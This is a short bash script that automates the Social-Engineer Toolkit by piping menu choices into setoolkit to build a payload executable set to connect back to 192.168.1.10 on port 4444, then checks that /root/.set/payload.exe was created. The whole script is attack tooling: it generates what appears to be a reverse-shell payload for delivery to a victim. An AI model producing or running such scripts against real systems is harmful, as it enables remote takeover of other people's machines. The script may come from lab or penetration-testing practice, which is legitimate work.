#!/bin/bash

echo "Generating payload..."

(
sleep 2
echo "y"

sleep 2
echo "1"

sleep 2
echo "4"

sleep 2
echo "2"

sleep 2
echo "192.168.1.10"

sleep 2
echo "4444"

sleep 2
echo "yes"

) | setoolkit

# Wait for payload creation
sleep 10

# Verify payload
if [ -f /root/.set/payload.exe ]; then
    echo "[+] SET Payload generated successfully"
else
    echo "[-] Error: Payload not found"
    exit 1
fi
